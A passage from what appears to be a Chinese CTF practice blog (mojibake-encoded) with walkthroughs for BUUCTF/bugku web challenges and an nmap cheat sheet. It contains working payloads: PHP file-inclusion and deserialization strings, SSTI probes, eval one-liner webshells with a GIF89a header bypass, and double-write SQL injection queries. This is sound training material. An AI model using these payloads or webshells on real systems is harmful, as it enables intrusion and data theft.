$password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ ä¸‰ä¸ªå‚æ•°ï¼Œå…ˆçœ‹çœ‹ä»–çš„åˆ¤æ–­è¯­å¥ï¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨textå˜é‡ï¼Œå¹¶ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºwelcome to the zjctfï¼›æ¥ç€åˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯å¦æœ‰æ•æ„Ÿè¯flagï¼Œè‹¥ä¸å­˜åœ¨åˆ™æ‰§è¡Œincludeå‡½æ•°ï¼›æœ€åå°†ä¸Šä¼ çš„passwordçš„å€¼ååºåˆ—åŒ–å¹¶è¾“å‡ºã€‚ æˆ‘ä»¬ä¸€æ­¥æ­¥æ¥ï¼Œå…ˆçœ‹ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾ä¸å­˜åœ¨textæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç›´æ¥ç»™textèµ‹å€¼welcome to the zjctfå‘¢ï¼Ÿä½†æ˜¯è¯•ç€ç›´æ¥èµ‹å€¼ï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤è¯´æ˜ç›´æ¥èµ‹å€¼è‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚æˆ‘ä»¬å°è¯•ç€ä½¿ç”¨httpä¼ªåè®®ï¼Œè¯•è¯•èƒ½ä¸èƒ½è¡Œã€‚ ç¬¬ä¸€ç§php://input æ­¤åè®®éœ€è¦ allow_url_include ä¸º on ï¼Œå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸º PHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸º php://input ,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚è¿™é‡Œç”¨ HackBar æŠ¥é”™äº† ä½†æ˜¯ç”¨bpæŠ“åŒ…ï¼Œå†ä¸Šä¼ å°±çœ‹åˆ°æœ‰å›æ˜¾ï¼Œè¯´æ˜è¿™æ ·å­æ˜¯å¯è¡Œçš„ã€‚ ç¬¬äºŒç§data://ä¼ªåè®® data://åè®®éœ€è¦æ»¡è¶³åŒonæ¡ä»¶ï¼Œä½œç”¨å’Œ php://input ç±»ä¼¼ è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŒ‰ç…§ä¸Šè¿°æ–¹æ³•åªè¯»æµæ—¶ï¼Œè¦æŠŠphpä»£ç ç”¨base64ç¼–ç åå†ä¸Šä¼ ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬ç›´æ¥ä¸Šä¼ å¯èƒ½æœ‰äº›å­—ç¬¦ä¼šè¢«è¿‡æ»¤ã€‚ å› æ­¤ç¬¬ä¸€æ­¥çš„payloadï¼š?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= å†çœ‹ç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æœ‰includeå‡½æ•°ï¼Œé‚£ä¹ˆå¯èƒ½å°±å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨php://filteræ–‡ä»¶è¯»å–æµï¼Œç›´æ¥è¯»å–flag.phpè‚¯å®šæ˜¯ä¸è¡Œçš„äº†ï¼Œå› ä¸ºç¬¬äºŒä¸ªåˆ¤æ–­å°±è¦æ»¡è¶³æ–‡ä»¶åä¸­ä¸åŒ…å«flagå­—è¯ã€‚æ­¤å¤„åˆæé†’æˆ‘ä»¬æœ‰ä¸€ä¸ªuselessæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•è¯»å–è¯¥æ–‡ä»¶å†…å®¹ ç¬¬äºŒæ­¥çš„payloadï¼šfile=php://filter/read=convert.base64-encode/resource=useless.php å¯¹å›æ˜¾çš„å†…å®¹è¿›è¡Œbase64è§£ç å³å¯ï¼š 1234567891011121314&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; ä»£ç å®¡è®¡å‘ç°åŒ…å«æ–‡ä»¶ä¸­çš„å˜é‡fileæ²¡æœ‰åšä»»ä½•é˜²æŠ¤æªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥éšæ„æ§åˆ¶fileçš„å€¼ã€‚ é™„ä¸Šexpï¼š ä»£ç æ‰§è¡Œå®Œåä¼šäº§ç”Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼šO:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;ï¼› å½“æˆ‘ä»¬æŠŠè¿™ä¸²å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°passwordçš„å€¼ä¸Šä¼ åï¼Œunserializeå‡½æ•°å°†å…¶ååºåˆ—åŒ–ï¼Œè¿™æ—¶ç»“åˆfile_get_contentså‡½æ•°æ‰“å¼€flag.phpæ–‡ä»¶ï¼Œè¯»å–å¹¶è¾“å‡ºå›æ˜¾ã€‚ å› æ­¤è¿™å°±æ„æˆäº†ç¬¬ä¸‰ä¸ªpayloadï¼š?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; æ€»ç»“ä¸Šè¿°çš„ä¸‰ä¸ªpayloadï¼Œå°†ä»–ä»¬åˆæˆä¸€ä¸ªï¼š ?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; F12æŸ¥çœ‹æºç è·å¾—flagï¼š æ€»ç»“ï¼šè¿™æ˜¯ä¸€é“å…³äºhttpä¼ªåè®®ã€æ–‡ä»¶åŒ…å«æ¼æ´å’Œååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œåªè¦æ‡‚å¾—å¯¹åº”çš„ç‚¹æ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ã€‚","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"bugku3","date":"2021-07-12T10:33:50.000Z","path":"2021/07/12/bugku3/","text":"æœ€è¿‘çœ‹bugkuæ–°ä¸Šäº†ä¸€æ³¢é¢˜ï¼Œå°±åšä¸€ä¸‹ Game1æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ­æˆ¿å­çš„å°æ¸¸æˆï¼Œä¸€èˆ¬è¿™ç§é¢˜éƒ½æ˜¯é ä¿®æ”¹å¾—åˆ†æ¥è¾¾åˆ°è·å–flagè¦æ±‚ã€‚ f12æŸ¥çœ‹æºç ï¼š æ³¨æ„åˆ°ä¸€ä¸ªæäº¤æ–‡ä»¶ï¼Œä»–åŒ…æ‹¬äº†ä¸‰ä¸ªå˜é‡â€”â€”scoreå°±æ˜¯è¯¥å±€æ¸¸æˆå¾—åˆ†ï¼Œipå›ºå®šä¸ºpppçš„å€¼ï¼Œsignä¸ºè¯¥å±€æ¸¸æˆå¾—åˆ†ç»è¿‡base64ç¼–ç åçš„å€¼ å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼šscore.php?score=6666&amp;ip=110.90.9.142&amp;sign=NjY2Ng== ä½†æ˜¯è¿™æ ·å›æ˜¾æ˜¯å¤±è´¥çš„ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿè¯•ç©ä¸¤å±€æ¸¸æˆ æˆ‘ä»¬çŸ¥é“50çš„base64ç¼–ç æ˜¯NTA=ï¼Œè€Œè¿™é‡Œçœ‹åˆ°ä»–å‰é¢è¿˜å¤šäº†å‰ç¼€zM å¤šç©äº†å‡ å±€åå‘ç°ä»–çœŸå®çš„sign=&#39;zM&#39;+&#39;Base64.encode(score.toString())&#39;+&#39;==&#39; åŠ ä¸Šå‰ç¼€åå°±æˆåŠŸå¾—åˆ°flagå•¦ spï¼šç”±äºæœ€è¿‘åœ¨å­¦ä¹ pythonæ‰€ä»¥å°±å­¦ä¹ å¤§ä½¬çš„è„šæœ¬çœ‹çœ‹èƒ½ä¸èƒ½è·‘å‡ºçˆ†flagçš„ä¸´ç•Œç‚¹å†å“ªï¼š 123456789101112131415import requestsfrom base64 import b64encodeurl=&quot;http://114.67.246.176:15342/score.php?score=&quot;url2=&quot;&amp;ip=110.90.9.142&amp;sign=zM&quot;for i in range (1000,100000): i=str(i) j=b64encode(i.encode()) j=j.decode() r=requests.get(url+i+url2+j+&#x27;==&#x27;) print(i) if &#x27;å¤±è´¥äº†&#x27; not in r.text: print (r.text) break æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸´ç•Œç‚¹å°±æ˜¯3000åˆ† å‚è€ƒåšå®¢ï¼šhttps://blog.csdn.net/weixin_44190459/article/details/116648352 å˜é‡1æ‰“å¼€å®¹å™¨æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æºç ï¼š 12345678910111213&lt;?php error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#x27;args&#x27;]))&#123; $args = $_GET[&#x27;args&#x27;]; if(!preg_match(&quot;/^\\w+$/&quot;,$args))&#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;);&#125;?&gt; ä»£ç å®¡è®¡æˆ‘ä»¬å¾—çŸ¥æˆ‘ä»¬ä¼ å‚çš„å€¼å®šåªå«æ•°å­—ï¼Œå­—æ¯ï¼Œä¸‹åˆ’çº¿ã€‚å› æ­¤è¿™é‡Œè¿‡æ»¤äº†æ‰€æœ‰çš„ç¬¦å·ã€‚ ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¯å˜å˜é‡ï¼Œå¯å˜å˜é‡ï¼š æ˜¯ä¸€ç§ç‹¬ç‰¹çš„å˜é‡ï¼Œå®ƒå…è®¸åŠ¨æ€æ”¹å˜ä¸€ä¸ªå˜é‡åç§°ã€‚å…¶å·¥ä½œåŸç†æ˜¯è¯¥å˜é‡çš„åç§°ç”±å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼æ¥ç¡®å®šï¼Œå®ç°è¿‡ç¨‹å°±æ˜¯åœ¨å˜é‡çš„å‰é¢å†å¤šåŠ ä¸€ä¸ªç¾å…ƒç¬¦å·â€œSâ€ã€‚ è€Œè¿™é‡Œ**var_dump()**å‡½æ•° æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚ç»“åˆå¯å˜å˜é‡åé‚£ä¹ˆå°±ä¼šè¿”å›å¯¹åº”çš„é”®å€¼ã€‚ æ­¤æ—¶æˆ‘ä»¬è¦è”æƒ³åˆ°phpä¸­è¶…å…¨å±€å˜é‡ $GLOBALS ï¼ŒPHP åœ¨åä¸º$GLOBALS[index]çš„æ•°ç»„ä¸­å­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ å› æ­¤æ„é€ payloadï¼š?args=GLOBLAS å‚è€ƒåšå®¢ï¼šhttps://blog.csdn.net/xuchen16/article/details/82737194 ç§‹åå±±è½¦ç¥ç‚¹å¼€å®¹å™¨å°±ç»™æˆ‘ä»¬ä¸€é•¿ä¸²æ•°å­—è¦æˆ‘ä»¬åœ¨ä¸¤ç§’å†…è®¡ç®—å®Œæˆï¼Œæ˜¾ç„¶æ˜¯ä¸å¯èƒ½å®ç°çš„ï¼Œå› æ­¤éœ€è¦æ„é€ è„šæœ¬ï¼š 123456789import requestsimport reurl = &#x27;&#x27;&#x27;http://114.67.246.176:19230/&#x27;&#x27;&#x27;s = requests.session()retuen = s.get(url)equation = re.search(r&#x27;(\\d+[+\\-*])+(\\d+)&#x27;, retuen.text).group()result = eval(equation)key = &#123;&#x27;value&#x27;:result&#125;print(s.post(url, data = key).text) è·‘è„šæœ¬çš„æ—¶å€™å¯èƒ½ä¸ä¼šæ¯æ¬¡éƒ½å‡ºflagï¼ˆå¯èƒ½ç»™å‡ºçš„å¼å­æº¢å‡ºæˆ–è€…ä»€ä¹ˆçš„ï¼‰ï¼Œæ²¡å‡ºå°±å¤šè·‘å‡ æ¬¡ å‚è€ƒèµ„æ–™ï¼šå…³äºå¯¹pythonè„šæœ¬çš„ç†è§£ï¼ˆä¸»è¦æ˜¯pythonè„šæœ¬ä¸‹çš„æ­£åˆ™åŒ¹é…ï¼‰ï¼šhttps://blog.csdn.net/weixin_43578492/article/details/101701339","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf5","date":"2021-07-11T01:35:54.000Z","path":"2021/07/11/buuctf5/","text":"[æŠ¤ç½‘æ¯ 2018]easy_tornadoæ‰“å¼€å®¹å™¨å‘ç°æœ‰ä¸‰ä¸ªtxtæ–‡ä»¶: /flag.txtï¼Œç”±æ­¤æˆ‘ä»¬çŒœæµ‹flagæœ€ç»ˆå¯èƒ½è—åœ¨/fllllllllllllagä¹‹ä¸‹ /welcome.txtï¼Œå› ä¸ºrenderæ˜¯ç”Ÿæˆæ¨¡æ¿å‡½æ•°ï¼Œæ‰€ä»¥è€ƒè™‘æ˜¯å¦å­˜åœ¨sstiæ³¨å…¥ spï¼šrenderå‡½æ•°çš„ä»‹ç»https://blog.csdn.net/qq78827534/article/details/80792514 /hints.txt ç»“åˆURLæ çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯çŸ¥filehashçš„å€¼æ˜¯md5(cookie_secret+md5(filename))ï¼Œä¹Ÿå³æ­¤å¤„filehashçš„å€¼æ˜¯md5(cookie_secret+md5(hints)) ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªç–‘é—®cookie_secretæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿé€šè¿‡æŸ¥é˜…å¤§ä½¬çš„åšå®¢å‘ç°cookie_secretåœ¨Applicationå¯¹è±¡settingså±æ€§ä¸­ï¼Œè¿˜å‘ç°self.application.settingsæœ‰ä¸€ä¸ªåˆ«åã€‚handleræŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡ï¼Œ RequestHandler.settingsæŒ‡å‘self.application.settingsï¼Œ å› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settings çŸ¥é“äº†cookie_secretåœ¨å“ªäº†ï¼Œå°±è¦æƒ³ç€æ€ä¹ˆè·å–å®ƒï¼Œä¹‹å‰æåˆ°å¯èƒ½å­˜åœ¨sstiæ³¨å…¥ï¼Œ ç°åœ¨æ¥éªŒè¯ä¸€ä¸‹ï¼Œå½“æˆ‘è¾“å…¥?filename=/flag.txt&amp;filehash=&#123;&#123;1&#125;&#125;ï¼š è¯´æ˜å­˜åœ¨sstiæ¼æ´ï¼Œè™½ç„¶å®ƒè¿‡æ»¤æ‰äº†ä¸€äº›å­—ç¬¦ï¼Œä½†æ˜¯è¿™é‡ŒError=Errorã€‚ å› æ­¤ç»“åˆå‰é¢è·å–cookie_secretçš„æ–¹æ³•ï¼Œ æ„é€ payloadï¼šhttp://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125; ä½¿ç”¨ä¸‹é¢è„šæœ¬ 1234import hashlibs1=(hashlib.md5(&quot;/fllllllllllllag&quot;.encode())).hexdigest()print((hashlib.md5((&quot;87928a6f-e43f-4549-bc43-a101005cfb7f&quot;+s1).encode())).hexdigest()) æ„é€ payloadï¼š http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=61f9debba03909a86238270e8c7fb594 æ€»ç»“ï¼šæ„Ÿè§‰å…³äºè·å–cookie_secreté‚£å—è¿˜æ˜¯æœ‰ç‚¹æ¨¡ç³Šï¼Œsstiä¹Ÿæ˜¯ä¸€å¤§å—çš„å†…å®¹ï¼Œæš‚æ—¶åˆå­¦äº†ä¸€ç‚¹ã€‚ https://blog.csdn.net/zz_Caleb/article/details/96480967 https://blog.csdn.net/weixin_45642610/article/details/112519061 https://www.cnblogs.com/wangtanzhi/p/12238779.html [æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ æ¼æ´é¢˜ï¼Œå°è¯•ä¸Šä¼ webshell.php: 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªèƒ½ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œå°è¯•ä¸Šä¼ webshell.gifæ–‡ä»¶ç„¶åæŠ“åŒ…æ”¹ä¸ºwebshell.phtmlï¼š ä¿®æ”¹ä¸€å¥è¯æœ¨é©¬webshell2.gifï¼š 1&lt;script language=&quot;php&quot;&gt;eval(@POST[&#x27;pass&#x27;])&lt;/script&gt; ç„¶åä¸Šä¼ webshell2.gifæ–‡ä»¶ï¼š ä¹Ÿå°±æ˜¯ä»–å¯¹æ–‡ä»¶å¤´ä¹Ÿè¿›è¡Œäº†æ£€æŸ¥ï¼Œè¿™é‡Œå…¶å®å°±è®¾ç«‹äº†ä¸€ä¸ªè€ƒç‚¹â€”â€”å…³äºGIF89aæ–‡ä»¶å¤´æ¬ºéª—ï¼Œå®ƒå¯ä»¥ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥ã€‚å› æ­¤å†ä¿®æ”¹ä¸€å¥è¯æœ¨é©¬webshell3.gifï¼š 12GIF89a&lt;script language=&quot;php&quot;&gt;eval(@POST[&#x27;pass&#x27;])&lt;/script&gt; ä¸Šä¼ webshell3.gifæ–‡ä»¶ç„¶åæŠ“åŒ…æ”¹ä¸ºwebshell3.phtmlï¼Œ ä¸Šä¼ æˆåŠŸï¼ ç„¶åç”¨èšå‰‘è¿æ¥ï¼ŒçŒœæµ‹ä¸Šä¼ è·¯å¾„æ˜¯/upload è¿æ¥æˆåŠŸï¼Œæ‰“å¼€è™šæ‹Ÿç»ˆç«¯ï¼Œcat /flagï¼š [ACTF2020 æ–°ç”Ÿèµ›]Uploadæ‰“å¼€å®¹å™¨ï¼Œæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ã€‚ ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬webshell.jpgï¼š 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; ä¸Šä¼ æˆåŠŸ ä¸Šä¼ webshell.jpg æŠ“åŒ…æ”¹åç¼€webshell.php ä¸Šä¼ å¤±è´¥ å†ä¸Šä¼ webshell.jpg æŠ“åŒ…æ”¹åç¼€webshell.phtml ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ï¼Œcat /flag æ€»ç»“ï¼šæ„Ÿè§‰è¿™é¢˜æ¯”ä¸Šé¢é‚£é¢˜è¿˜å®¹æ˜“ï¼Œå°±ä»…å¯¹æ–‡ä»¶ä¸Šä¼ åç¼€è¿›è¡Œäº†é™åˆ¶","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CTFå·¥å…·ç”¨æ³•","date":"2021-06-06T03:16:10.000Z","path":"2021/06/06/CTFå·¥å…·ç”¨æ³•/","text":"dirsearchæŒ‡ä»¤ï¼špython dirsearch.py -uâ€127.0.0.1â€ nmapnmapå¸¸è§çš„æŒ‡ä»¤ nmap -v è¯¦ç»†ä¿¡æ¯è¾“å‡º nmap -p æŒ‡å®šç«¯å£ nmap -iL æ‰«ææ–‡ä»¶ä¸­çš„ip nmap -exclude ä¸æ‰«ææŸäº›ip nmap -Pn ä½¿ç”¨pingæ‰«æï¼Œæ˜¾å¼åœ°å…³é—­ç«¯å£æ‰«æï¼Œç”¨äºä¸»æœºå‘ç° nmap -sn ä½¿ç”¨pingæ‰«æï¼Œè¿›è¡Œç«¯å£æ‰«æï¼Œå‡è®¾ä¸»æœºéƒ½æ˜¯upçš„ nmap -sS ä½¿ç”¨SYNæ‰«æï¼Œä¸éœ€è¦å®Œæˆä¸‰æ¬¡æ¡æ‰‹ nmap -sT TCP connectæ‰«æï¼Œéœ€è¦å®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼Œåªé€‚ç”¨äºæ‰¾å‡ºTCPå’ŒUDPç«¯å£ nmap -sU æ‰«æUDPç«¯å£ nmap -sF FINæ‰«æï¼Œç”¨äºæ¢æµ‹é˜²ç«å¢™çŠ¶æ€ï¼Œè¯†åˆ«ç«¯å£æ˜¯å¦å…³é—­ï¼Œå®¹æ˜“æ¼æ‰« nmap -sV æ‰«æç›®æ ‡ä¸»æœºçš„ç«¯å£å’Œè½¯ä»¶ç‰ˆæœ¬ nmap -O è¿œç¨‹æ£€æµ‹æ“ä½œç³»ç»Ÿå’Œè½¯ä»¶ nmap -O â€“osscan-guess çŒœæµ‹ç›®æ ‡æ“ä½œç³»ç»Ÿç‰ˆæœ¬ nmap -traceroute è·¯ç”±è·Ÿè¸ª nmap -A ç»¼åˆæ‰«æï¼ŒåŒ…å«1-10000çš„ç«¯å£pingæ‰«æï¼Œæ“ä½œç³»ç»Ÿæ‰«æï¼Œè„šæœ¬æ‰«æï¼Œè·¯ç”±è·Ÿè¸ªï¼ŒæœåŠ¡æ¢æµ‹ nmap -oN result.txt å°†æ ‡å‡†è¾“å‡ºå†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ nmap -oX result.xml å°†è¾“å…¥å†™æˆxmlçš„å½¢å¼ nmap -oS result.txt å°†è¾“å‡ºå†™æˆç‰¹æ®Šç¬¦å·çš„å½¢å¼ï¼Œå†…å®¹è·Ÿ-oNæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å­—ä½“å˜äº†è€Œå·² nmap -oG result.txt å°†è¾“å‡ºå†™æˆç‰¹æ®Šæ ¼å¼ nmap -oA å°†è¾“å‡ºæ‰€æœ‰æ ¼å¼ï¼Œæœ‰ä¸‰ç§ .xml/ .gnmap/ .nmap nmap -T[0-5] æ—¶é—´å‚æ•°æ¨¡æ¿ -T0 ç”¨äºèº²é¿IDSï¼Œæ—¶é—´å¾ˆé•¿ -T1 ç”¨äºèº²é¿IDSï¼Œæ—¶é—´å¾ˆé•¿ -T2 é™ä½äº†æ‰«æé€Ÿåº¦ï¼Œä½¿ç”¨æ›´å°çš„å¸¦å®½å’Œç›®æ ‡ä¸»æœºèµ„æºå¯¹ç›®æ ‡é¶æœºè¿›è¡Œæ‰«æ -T3 é»˜è®¤æ¨¡å¼ï¼Œæœªåšä¼˜åŒ– -T4 å‡è®¾ç”¨æˆ·å…·æœ‰åˆé€‚åŠå¯é çš„ç½‘ç»œè€ŒåŠ é€Ÿå¯¹ç›®æ ‡é¶æœºçš„æ‰«æ -T5 å‡è®¾ç”¨æˆ·å…·æœ‰æ›´å¥½çš„ç½‘ç»œæˆ–è€…æ„¿æ„ç‰ºç‰²å‡†ç¡®æ€§è€ŒåŠ é€Ÿæ‰«æ nmap -sC æ ¹æ®ç«¯å£è¯†åˆ«æœåŠ¡è‡ªåŠ¨è°ƒç”¨é»˜è®¤è„šæœ¬ å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/haha13l4/article/details/89737637?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase GitHackæŒ‡ä»¤ï¼šGitHack.py 127.0.0.1/.git/ å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚","tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"buuctf4","date":"2021-05-23T06:43:06.000Z","path":"2021/05/23/buuctf4/","text":"[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å…¥å¾—ç•Œé¢ï¼Œç¡®å®šæ˜¯ä¸€é“SQLæ³¨å…¥é¢˜ å…ˆç”¨ä¸‡èƒ½å¯†ç å°è¯•ä¸€ä¸‹ï¼š æˆ‘ä»¬çœ‹åˆ°orå¹¶æ²¡æœ‰èµ·åˆ°ä½œç”¨ï¼Œè¯´æ˜ä»–è¢«è¿‡æ»¤äº†ï¼Œå°è¯•åŒå†™ç»•è¿‡ï¼š æˆ‘ä»¬çœ‹åˆ°ç™»å…¥æˆåŠŸäº†ï¼Œå°è¯•unionè”åˆæ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æœåŠ¡å™¨è¿‡æ»¤äº†union å’Œ selectï¼Œä¹Ÿå°è¯•åŒå†™ç»•è¿‡ï¼š ?username=1â€™%20 uniounionn selecselectt 1%23&amp;password=123 æˆ‘ä»¬çœ‹åˆ°æˆåŠŸæ³¨å…¥äº†ï¼Œä½†æ˜¯åˆ—æ•°ä¸åŒ¹é…ï¼Œå¢åŠ åˆ—æ•°ï¼š å¼€å§‹çˆ†åº“ï¼š?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1è¿”å›çš„æ˜¯é»˜è®¤æ•°æ®åº“ æŸ¥ä¸€ä¸‹æ‰€æœ‰æ•°æ®åº“ï¼š ?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1 æ„Ÿè§‰flagå¯èƒ½è—åœ¨ctfæ•°æ®åº“ä¸­ çˆ†è¡¨ï¼š?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1 çˆ†åˆ—ï¼š?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1 çˆ†å€¼ï¼š?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1 [MRCTF2020]Ez_bypassæ‰“å¼€å®¹å™¨å‘ç°ä¸€æ®µphpä»£ç ï¼Œæ•´ç†å¾—ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first ä»£ç å®¡è®¡å¯çŸ¥ï¼Œæˆ‘ä»¬é€šè¿‡GETè·å–ggå’Œidä¸¤ä¸ªå‚æ•°ï¼Œé€šè¿‡POSTè·å–passwdã€‚ å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼šif( md5($id) === md5($gg) &amp;&amp; $id !== $gg ) 